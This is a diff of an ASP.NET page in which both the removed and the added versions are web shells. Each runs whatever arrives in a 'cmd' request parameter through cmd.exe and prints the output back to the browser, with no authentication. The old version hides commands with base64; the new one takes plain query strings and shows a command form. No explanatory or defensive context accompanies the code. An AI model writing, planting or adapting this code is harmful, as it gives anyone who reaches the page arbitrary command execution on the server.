@@ -1,60 +1,35 @@
 <%@ Page Language="C#" %>
-<%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Diagnostics" %>
-<%@ Import Namespace="System.Text" %>
-
+<%@ Import Namespace="System.IO" %>
 <script runat="server">
-protected void Page_Load(object sender, EventArgs e)
-{
-    string cmdBase64 = Request["cmd"];
-    if (!string.IsNullOrEmpty(cmdBase64))
+    protected void Page_Load(object sender, EventArgs e)
     {
-        try
+        string cmd = Request.QueryString["cmd"];
+        if (!string.IsNullOrEmpty(cmd))
         {
-            // Decode Base64 command
-            string command = Encoding.UTF8.GetString(Convert.FromBase64String(cmdBase64));
+            try
+            {
+                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
+                psi.RedirectStandardOutput = true;
+                psi.RedirectStandardError = true;
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
 
-            // Execute command via cmd.exe
-            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command);
-            psi.RedirectStandardOutput = true;
-            psi.RedirectStandardError = true;
-            psi.UseShellExecute = false;
-            psi.CreateNoWindow = true;
+                Process proc = Process.Start(psi);
+                string output = proc.StandardOutput.ReadToEnd();
+                string error = proc.StandardError.ReadToEnd();
+                proc.WaitForExit();
 
-            Process proc = Process.Start(psi);
-            string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
-            proc.WaitForExit();
-
-            // Encode output to Base64
-            string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-
-            Response.Write("<b>Base64 Output:</b><br/>" + outputBase64 + "<br/><br/>");
-            Response.Write("<b>Decoded Output:</b><br/>" + output);
+                Response.Write("<pre>Output:\n" + output + "\nError:\n" + error + "</pre>");
+            }
+            catch (Exception ex)
+            {
+                Response.Write("Exception: " + ex.Message);
+            }
         }
-        catch (Exception ex)
+        else
         {
-            Response.Write("Error: " + ex.Message);
+            Response.Write("<form method='get'>Command: <input name='cmd'/><input type='submit'/></form>");
         }
     }
-}
 </script>
-
-<html>
-<body>
-<form id="cmdForm" method="get" onsubmit="encodeCmd(); return false;">
-    Command: <br/>
-    <input type="text" id="cmdInput" name="cmdInput" style="width:400px;" />
-    <input type="submit" value="Execute" />
-</form>
-
-<script>
-function encodeCmd() {
-    var input = document.getElementById('cmdInput').value;
-    // Encode to Base64
-    var encoded = btoa(input);
-    // Redirect to same page with Base64 param
-    window.location.href = "?cmd=" + encodeURIComponent(encoded);
-}
-</script>
-</body>
-</html>
